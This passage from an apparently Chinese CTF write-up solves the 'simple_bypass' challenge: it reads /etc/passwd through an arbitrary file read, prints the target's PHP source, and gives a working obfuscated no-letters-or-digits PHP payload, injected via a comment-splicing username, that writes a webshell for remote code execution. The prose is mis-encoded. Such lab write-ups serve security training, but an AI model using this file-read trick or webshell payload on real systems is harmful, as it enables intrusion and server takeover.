2022]simple_bypass</h2><p>æ³¨å†Œç™»é™†ä¸€ä¸‹å°±å¥½ï¼Œåœ¨å¥½åº·çš„å¤„å‘ç°phpçš„è·³è½¬ï¼Œå‘ç°é‚£é‡Œå¯èƒ½å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129162734692.png" alt="image-20241129162734692"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28995/get_pic.php?image=/etc/passwd</span><br></pre></td></tr></table></figure><p>ç„¶åæŸ¥çœ‹æºä»£ç è·å–ä¸€ä¸²base64</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129162758249.png" alt="image-20241129162758249" style="zoom:67%;" /><p>å®é”¤äº†ï¼ä»»æ„æ–‡ä»¶è¯»å–ï¼Œé‚£å°±è¯»å–ä¸€ä¸‹å½“å‰çš„è¿™ä¸ªæ–‡ä»¶å§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$image</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;image&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;img&quot;&gt; &lt;img src=&quot;data:image/png;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>)) . <span class="string">&#x27;&quot; /&gt; &lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ²¡å•¥ç”¨ï¼Œé‚£å°±çœ‹çœ‹index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$hash_user</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line"><span class="variable">$hash_pass</span> = <span class="string">&#x27;zsf&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//filter</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &gt; <span class="number">6</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Username is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) &gt; <span class="number">25</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Website is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]) &gt; <span class="number">1000</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Punctuation is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\(\)\*&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\*:\.\;\(\)\n&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[a-z,A-Z,0-9&gt;\?]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]);</span><br><span class="line"><span class="variable">$template</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__USER__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PASS__&quot;</span>, <span class="variable">$hash_pass</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__WEBSITE__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PUNC__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;sandbox/&#x27;</span>.<span class="variable">$hash_user</span>.<span class="string">&#x27;.php&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Successed!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in website!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in username!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>, <span class="variable">$hash_pass</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:sandbox/<span class="subst">$hash_user</span>.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge,chrome=1&quot;</span>&gt; </span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Simple Linux&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;css/styles.css&quot;</span>&gt;</span><br><span class="line">&lt;!--[<span class="keyword">if</span> IE]&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;http://libs.baidu.com/html5shiv/3.7/html5shiv.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;![<span class="keyword">endif</span>]--&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">jq22</span>-<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">padding</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login</span>-<span class="title">wrap</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login</span>-<span class="title">html</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">tab</span>-1&quot; <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">tab</span>&quot; <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">in</span>&quot; <span class="title">checked</span>&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">tab</span>-1&quot; <span class="title">class</span>=&quot;<span class="title">tab</span>&quot;&gt;<span class="title">Sign</span> <span class="title">In</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">tab</span>-2&quot; <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">tab</span>&quot; <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">up</span>&quot;&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">tab</span>-2&quot; <span class="title">class</span>=&quot;<span class="title">tab</span>&quot;&gt;<span class="title">Sign</span> <span class="title">Up</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login</span>-<span class="title">form</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">in</span>-<span class="title">htm</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">user</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">user</span>&quot; <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">pass</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot; <span class="title">data</span>-<span class="title">type</span>=&quot;<span class="title">password</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!-- &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">check</span>&quot; <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">class</span>=&quot;<span class="title">check</span>&quot; <span class="title">checked</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">check</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;/<span class="title">span</span>&gt; <span class="title">Keep</span> <span class="title">me</span> <span class="title">Signed</span> <span class="title">in</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt; --&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">value</span>=&quot;<span class="title">Sign</span> <span class="title">In</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hr</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!-- &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">foot</span>-<span class="title">lnk</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#<span class="title">forgot</span>&quot;&gt;<span class="title">Forgot</span> <span class="title">Password</span>?&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt; --&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">up</span>-<span class="title">htm</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">user</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">user</span>&quot; <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">pass</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot; <span class="title">data</span>-<span class="title">type</span>=&quot;<span class="title">password</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Your</span> <span class="title">Website</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">website</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Your</span> <span class="title">Punctuation</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">punctuation</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">value</span>=&quot;<span class="title">Sign</span> <span class="title">Up</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hr</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">foot</span>-<span class="title">lnk</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">tab</span>-1&quot;&gt;<span class="title">Already</span> <span class="title">Member</span>?&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å®¡è®¡ä¸Šæ–¹ä»£ç å‘ç°å­˜åœ¨file_put_contentsï¼Œå¯ä»¥å¯¹phpæ–‡ä»¶å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>æœ‰å››ä¸ªé€‰æ‹©ï¼Œé€‰å“ªä¸ªå¥½å‘¢ï¼Ÿæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹template.htmlï¼Œå¹¶æ‰¾åˆ°å…³é”®ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">        &lt;li&gt;&lt;span class=&quot;adminImg&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$user = ((string)__USER__);</span><br><span class="line">$pass = ((string)__PASS__);</span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&#x27;user&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;pass&#x27;]) &amp;&amp; $_COOKIE[&#x27;user&#x27;] === $user &amp;&amp; $_COOKIE[&#x27;pass&#x27;] === $pass)&#123;</span><br><span class="line">echo($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;&lt;script&gt;alert(&#x27;Permission denied!&#x27;);&lt;/script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">      &lt;ul class=&quot;item&quot;&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;sitting_btn&quot;&gt;&lt;/span&gt;ç³»ç»Ÿè®¾ç½®&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;help_btn&quot;&gt;&lt;/span&gt;ä½¿ç”¨æŒ‡å— &lt;b&gt;&lt;/b&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;about_btn&quot;&gt;&lt;/span&gt;å…³äºæˆ‘ä»¬&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;logout_btn&quot;&gt;&lt;/span&gt;é€€å‡ºç³»ç»Ÿ&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;a href=&quot;#&quot; class=&quot;powered_by&quot;&gt;__PUNC__&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>åªæœ‰__PUNC__æ˜¯æœ€å¥½åˆ©ç”¨çš„ï¼Œä½†æ˜¯é—®å·è¢«è¿‡æ»¤äº†ï¼Œæƒ³è¦è®©å®ƒè§£æphpï¼Œè¿™æ—¶å°±éœ€è¦å®ƒåœ¨ä¸Šé¢çš„phpé‡Œé¢ï¼Œä½†æ˜¯ä¸Šé¢çš„phpè¢«é—­åˆè¿‡äº†ï¼Œä½†æ˜¯æˆ‘ä»¬åˆå‘ç°å…¶å®__USER__ï¼Œ__PASS__è¿™äº›éƒ½æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šè¡Œæ³¨é‡Šæ¥è§£å†³é—®é¢˜ã€‚æœ€åå†æŠŠåé¢çš„æ³¨é‡Šæ‰å°±è¡Œï¼Œä¸ç„¶æ ‡ç­¾é—­åˆä¼šå‡ºç°é—®é¢˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ³¨å†Œæ—¶ç”¨æˆ·åä¸ºa/*</span><br><span class="line">å¯†ç ä¸ºa</span><br><span class="line">websiteä¸ºa</span><br><span class="line">æè¿°ä¸º*/);$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);/*</span><br><span class="line">å³å¯ï¼Œæ— æ•°å­—å­—æ¯rceï¼Œç®€å•çš„å¾ˆ</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&#x27;sandbox/&#x27;.$hash_user.&#x27;.php&#x27;, $content);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129185322665.png" alt="image-20241129185322665"></p><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç å³å¯è·å–flag</p><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 